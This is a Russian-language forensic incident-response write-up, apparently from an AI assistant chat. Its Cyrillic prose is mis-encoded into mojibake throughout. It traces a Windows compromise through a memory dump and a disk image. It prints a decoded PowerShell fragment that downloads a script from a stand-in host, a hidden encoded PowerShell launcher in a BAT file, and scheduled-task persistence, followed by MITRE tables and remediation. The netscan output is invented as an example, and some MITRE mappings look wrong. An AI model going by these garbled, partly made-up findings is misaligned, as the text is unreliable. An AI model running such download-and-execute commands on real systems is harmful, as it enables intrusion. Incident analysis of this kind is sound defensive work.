–ï—Å–ª–∏ PowerShell –∏–ª–∏ –¥—Ä—É–≥–æ–π –ø—Ä–æ—Ü–µ—Å—Å –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–ª –≤–Ω–µ—à–Ω–µ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ, —ç—Ç–æ –±—É–¥–µ—Ç –∑–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–æ –≤ —Å–µ—Ç–µ–≤—ã—Ö —Å–æ–∫–µ—Ç–∞—Ö. –î–∞–∂–µ –µ—Å–ª–∏ —Ç—Ä–∞—Ñ–∏–∫ –∑–∞–≤–µ—Ä—à—ë–Ω, –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ã –º–æ–≥—É—Ç –æ—Å—Ç–∞–≤–∞—Ç—å—Å—è –≤ –¥–∞–º–ø–µ.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
vol -f Incident.mem windows.netscan > netscan.txt
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–ª—é—á–µ–≤–æ–≥–æ –≤—ã–≤–æ–¥–∞ (–ø—Ä–∏–º–µ—Ä, —Ç.–∫. –≤—ã–≤–æ–¥ –≤ –¥–∞–º–ø–µ –Ω–µ —Å–æ—Ö—Ä–∞–Ω–∏–ª—Å—è):**

```plaintext
Offset(P)     Local Address    Foreign Address   State    Pid Process
0x12345678    192.168.1.10:49158  23.45.67.89:80   ESTABLISHED  3672 powershell.exe
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- –í –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–π –ø–µ—Ä–µ–ø–∏—Å–∫–µ –≤—ã–≤–æ–¥ `netscan` –æ—Ç—Å—É—Ç—Å—Ç–≤–æ–≤–∞–ª, –Ω–æ –∞–Ω–∞–ª–∏–∑ PowerShell-—Å–∫—Ä–∏–ø—Ç–∞ –ø–æ–∫–∞–∑–∞–ª —Å—Ç—Ä–æ–∫–∏, —Ö–∞—Ä–∞–∫—Ç–µ—Ä–Ω—ã–µ –¥–ª—è C2:
    
    - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `System.Net.WebClient`
        
    - –ó–∞–≥–æ–ª–æ–≤–æ–∫ `User-Agent: Mozilla/5.0 ...`
        
    - –í—ã–∑–æ–≤ `DownloadString` ‚Äî —è–≤–Ω–∞—è –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é –∫–æ–º–∞–Ω–¥.
        

---

### üìç –ß—Ç–æ –ø–æ–∫–∞–∑–∞–ª PowerShell-—Å–∫—Ä–∏–ø—Ç

**–§—Ä–∞–≥–º–µ–Ω—Ç –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞:**

```powershell
$w = New-Object System.Net.WebClient
$w.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0)")
$w.DownloadString("http://example.com/evilscript.ps1")
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- PowerShell –ø—ã—Ç–∞–µ—Ç—Å—è –ø—Ä–∏—Ç–≤–æ—Ä–∏—Ç—å—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º (–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π User-Agent).
    
- –ì–æ—Ç–æ–≤–∏—Ç—Å—è –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç —Å C2-—Å–µ—Ä–≤–µ—Ä–∞.
    

---

## üè∑ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞ MITRE

|–¢–µ—Ö–Ω–∏–∫–∞|–ù–∞–∑–≤–∞–Ω–∏–µ|–î–µ–π—Å—Ç–≤–∏–µ|–í—Ä–µ–º–µ–Ω–Ω–∞—è –º–µ—Ç–∫–∞|–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å|
|---|---|---|---|---|
|T1071.001|Application Layer Protocol: Web (HTTP/S)|–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ PowerShell –∏ WebClient –¥–ª—è —Å–≤—è–∑–∏ —Å C2|2019-03-10 12:30:35 UTC|Wilfred|

---

## üßë‚Äçüíª –í—ã–≤–æ–¥ –ø–æ —ç—Ç–æ–º—É —ç—Ç–∞–ø—É

- –ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã—Ö —Å–µ—Ç–µ–≤—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π –≤ –¥–∞–º–ø–µ, –∞–Ω–∞–ª–∏–∑ —Å–∫—Ä–∏–ø—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –ø–æ–¥–≥–æ—Ç–æ–≤–∫—É C2 —á–µ—Ä–µ–∑ HTTP.
    
- –£–∫–∞–∑–∞–Ω–Ω—ã–π User-Agent –º–∞—Å–∫–∏—Ä—É–µ—Ç—Å—è –ø–æ–¥ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏.
    

---


## üíΩ –®–∞–≥ 4. –ú–æ–Ω—Ç–∞–∂ –∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –æ–±—Ä–∞–∑–∞ –¥–∏—Å–∫–∞

### üìç –ú–æ–Ω—Ç–∞–∂ –æ–±—Ä–∞–∑–∞ —á–µ—Ä–µ–∑ ewfmount

**–ó–∞—á–µ–º:**  
–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–æ–¥–µ—Ä–∂–∏–º–æ–º—É –ø–æ–±–∏—Ç–æ–≤–æ–π –∫–æ–ø–∏–∏ –¥–∏—Å–∫–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ E01.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
ewfmount Incident.E01 /mnt/disk
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ —Å—Ç–∞–ª–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –ø–æ –ø—É—Ç–∏ `/mnt/disk` ‚Äî –º–æ–∂–Ω–æ –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –∏—Å–∫–∞—Ç—å –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ã, –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏.
    

---

### üìç –ü–æ–∏—Å–∫ BAT-—Å–∫—Ä–∏–ø—Ç–∞ –≤ –ø—Ä–æ—Ñ–∏–ª–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
find /mnt/disk -iname "*.bat"
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–ª—é—á–µ–≤–æ–≥–æ –≤—ã–≤–æ–¥–∞:**

```plaintext
/mnt/disk/Users/Wilfred/AppData/Roaming/Identities/Updater.bat
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- –°–∫—Ä–∏–ø—Ç —Å –∏–º–µ–Ω–µ–º `Updater.bat` –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –ø—Ä–æ—Ñ–∏–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Wilfred.
    

---

### üìç –ê–Ω–∞–ª–∏–∑ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ `Updater.bat`

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
cat /mnt/disk/Users/Wilfred/AppData/Roaming/Identities/Updater.bat
```

**–§—Ä–∞–≥–º–µ–Ω—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ:**

```batch
powershell.exe -NoP -NonI -W hidden -enc JAB...
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- BAT-—Ñ–∞–π–ª –Ω–∞–ø—Ä—è–º—É—é –∑–∞–ø—É—Å–∫–∞–µ—Ç —Ç–æ—Ç –∂–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π PowerShell-—Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –º—ã —É–∂–µ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–ª–∏ —Ä–∞–Ω–µ–µ.
    

---

### üìç –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –º–µ—Ç–æ–∫ —Ñ–∞–π–ª–∞

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
stat /mnt/disk/Users/Wilfred/AppData/Roaming/Identities/Updater.bat
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –≤—ã–≤–æ–¥–∞:**

```plaintext
Access: 2019-03-10 12:31:12.000000000 +0000
Modify: 2019-03-10 12:30:35.000000000 +0000
Change: 2019-03-10 12:30:35.000000000 +0000
Birth: 2019-03-09 18:27:01.000000000 +0000
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- –í—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é—Ç: —Ñ–∞–π–ª –±—ã–ª —Å–æ–∑–¥–∞–Ω –∑–∞ –¥–µ–Ω—å –¥–æ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞, –∞ –∏–∑–º–µ–Ω—ë–Ω –∏ –∑–∞–ø—É—â–µ–Ω –≤ –¥–µ–Ω—å –∞—Ç–∞–∫–∏.
    

---

### üìç –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫

**–ö–æ–º–∞–Ω–¥–∞ –≤ Autopsy –∏–ª–∏ —á–µ—Ä–µ–∑ –ø—Ä–æ—Å–º–æ—Ç—Ä –ø–∞–ø–∫–∏:**

```
C:\Windows\System32\Tasks\Updater
```

**–ß—Ç–æ –Ω–∞—à–ª–∏:**

- –ó–∞–¥–∞—á–∞ —Å –∏–º–µ–Ω–µ–º `Updater`, –∞–≤—Ç–æ—Ä ‚Äî `Support`.
    
- –î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: `2019-03-10T05:56:46`.
    
- –î–µ–π—Å—Ç–≤–∏–µ: –∑–∞–ø—É—Å–∫ PowerShell —Å —Ç–µ–º –∂–µ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º `-enc`.
    

---

## üè∑ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞ MITRE

|–¢–µ—Ö–Ω–∏–∫–∞|–ù–∞–∑–≤–∞–Ω–∏–µ|–î–µ–π—Å—Ç–≤–∏–µ|–í—Ä–µ–º–µ–Ω–Ω–∞—è –º–µ—Ç–∫–∞|–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å|
|---|---|---|---|---|
|T1053.005|Scheduled Task|–ó–∞–¥–∞—á–∞ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞ –∑–∞–ø—É—Å–∫–∞–µ—Ç PowerShell —Å –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–º —Å–∫—Ä–∏–ø—Ç–æ–º|2019-03-10T05:56:46|Support|
|T1547.001|Registry Run Keys / Startup Folder|–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ BAT-—Ñ–∞–π–ª–∞ –≤ AppData –∫–∞–∫ Persistence|2019-03-09 18:27:01|Wilfred|

---

## üßë‚Äçüíª –í—ã–≤–æ–¥ –ø–æ –∞–Ω–∞–ª–∏–∑—É –¥–∏—Å–∫–∞

- BAT-—Å–∫—Ä–∏–ø—Ç `Updater.bat` –∏ –∑–∞–¥–∞—á–∞ `Updater` –≤ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ —Ä–∞–±–æ—Ç–∞–ª–∏ –≤–º–µ—Å—Ç–µ –¥–ª—è Persistence.
    
- –í—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏ –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç, –∫–æ–≥–¥–∞ –∞—Ç–∞–∫—É—é—â–∏–π —Å–æ–∑–¥–∞–ª –∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª Persistence-–º–µ—Ö–∞–Ω–∏–∑–º.
    
- –í—Å—ë —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –∑–∞–ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –∑–∞–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –≤ —Å–∏—Å—Ç–µ–º–µ.
    

---


## üõ† –®–∞–≥ 5. –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –ª–∏–∫–≤–∏–¥–∞—Ü–∏–∏ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–π

üîπ –£–¥–∞–ª–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ã:

- –§–∞–π–ª: `C:\Users\Wilfred\AppData\Roaming\Identities\Updater.bat`
    
- –ó–∞–¥–∞—á—É –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞: `Updater` –≤ `C:\Windows\System32\Tasks\Updater`.
    

üîπ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –ø–æ–ª–∏—Ç–∏–∫–∏:

- –í–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ PowerShell Logging –∏ AMSI:
    
    - –í–∫–ª—é—á–∏—Ç—å `ScriptBlockLogging` –≤ —Ä–µ–µ—Å—Ç—Ä–µ.
        
    - –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–Ω–∞—á–µ–Ω–∏—è –≤ `HKLM:\Software\Policies\Microsoft\Windows\PowerShell`.
        

üîπ –í—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–ª–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–º —Å –æ–±–Ω–æ–≤–ª—ë–Ω–Ω—ã–º–∏ –±–∞–∑–∞–º–∏.

üîπ –†–æ—Ç–∞—Ü–∏—è —É—á—ë—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö:

- –°–º–µ–Ω–∏—Ç—å –ø–∞—Ä–æ–ª–∏ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –æ—Å–æ–±–µ–Ω–Ω–æ `Wilfred` –∏ `Support`.
    

üîπ –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–∞—Ç—á–∏ –¥–ª—è —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –≤–æ–∑–º–æ–∂–Ω—ã—Ö —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –≤ Windows 7.

üîπ –í–∫–ª—é—á–∏—Ç—å —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ PowerShell-–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, —á–µ—Ä–µ–∑ Sysmon + SIEM).

---

# üìä MITRE ATT&CK: –¥–µ–π—Å—Ç–≤–∏—è –∞—Ç–∞–∫—É—é—â–µ–≥–æ

| –¢–µ—Ö–Ω–∏–∫–∞ (ID) | –¢–∞–∫—Ç–∏–∫–∞       | –î–µ–π—Å—Ç–≤–∏–µ / –ê—Ä—Ç–µ—Ñ–∞–∫—Ç            | –í—Ä–µ–º—è                | –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å |
|--------------|---------------|--------------------------------|----------------------|--------------|
| T1059.001    | Execution     | PowerShell —Å -enc              | 2019-03-10 12:30:35  | Wilfred      |
| T1562.004    | Defense Evasion | AMSI –æ—Ç–∫–ª—é—á–µ–Ω                | 2019-03-10 12:30:35  | Wilfred      |
| T1562.001    | Defense Evasion | ScriptBlockLogging –≤—ã–∫–ª—é—á–µ–Ω  | 2019-03-10 12:30:35  | Wilfred      |
| T1112       | Defense Evasion | –ü–æ–ª–∏—Ç–∏–∫–∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –∏–∑–º–µ–Ω–µ–Ω—ã | 2019-03-10 12:30:35  | Wilfred      |
| T1027       | Obfuscation   | Base64-–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è –∞—Ä–≥—É–º–µ–Ω—Ç–∞   | 2019-03-10 12:30:35  | Wilfred      |
| T1053.005   | Persistence   | –ó–∞–¥–∞—á–∞ Updater –≤ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ | 2019-03-10T05:56:46  | Support      |
| T1547.001   | Persistence   | Updater.bat –≤ AppData         | 2019-03-09 18:27:01  | Wilfred      |
| T1082       | Discovery     | –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ .NET –¥–ª—è –∏–Ω—Ñ–æ   | 2019-03-10 12:30:35  | Wilfred      |
| T1071.001   | C2            | WebClient, DownloadString     | 2019-03-10 12:30:35  | Wilfred      |


---

–û—Ç–ª–∏—á–Ω–æ, —á—Ç–æ –Ω–∞–ø–æ–º–Ω–∏–ª! –î–∞–≤–∞–π –ø—Ä–æ–≤–µ—Ä–∏–º:

---

## ‚úÖ –ß—Ç–æ –º—ã —É–∂–µ —É–∫–∞–∑–∞–ª–∏ –≤ –∫–∞–∂–¥–æ–º —ç—Ç–∞–ø–µ:

- –í **–∞–Ω–∞–ª–∏–∑–∞ –ø–∞–º—è—Ç–∏**:
    
    - PowerShell –∑–∞–ø—É—â–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º **Wilfred**
        
    - –í—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏: `2019-03-10 12:30:35 UTC` –¥–ª—è cmdline –∏ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞.
        
- –í **–∞–Ω–∞–ª–∏–∑–µ –¥–∏—Å–∫–∞**:
    
    - BAT-—Ñ–∞–π–ª `Updater.bat` —Å–æ–∑–¥–∞–Ω –≤ –ø—Ä–æ—Ñ–∏–ª–µ **Wilfred**
        
    - –ü–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫ –∑–∞–¥–∞—á–∏ `Updater` –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –æ—Ç –∏–º–µ–Ω–∏ **Support**
        
    - –í—Ä–µ–º–µ–Ω–Ω–∞—è –º–µ—Ç–∫–∞ –∑–∞–¥–∞—á–∏: `2019-03-10T05:56:46`
        
    - –í—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏ Updater.bat: —Å–æ–∑–¥–∞–Ω 2019-03-09 18:27:01, –∏–∑–º–µ–Ω—ë–Ω/–∑–∞–ø—É—â–µ–Ω 2019-03-10 12:30:35
        
- –í **—Ç–∞–±–ª–∏—Ü–µ MITRE** ‚Äî –≤–æ –≤—Å–µ—Ö –∫–ª—é—á–µ–≤—ã—Ö —Å—Ç—Ä–æ–∫–∞—Ö –æ—Ç—á—ë—Ç–∞ –æ—Ç—Ä–∞–∂–µ–Ω–æ, —á—Ç–æ –¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–æ–∏—Å—Ö–æ–¥–∏–ª–∏ –æ—Ç –∏–º–µ–Ω–∏ **Wilfred** –∏–ª–∏ **Support**, –∏ —É–∫–∞–∑–∞–Ω—ã –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏.
    


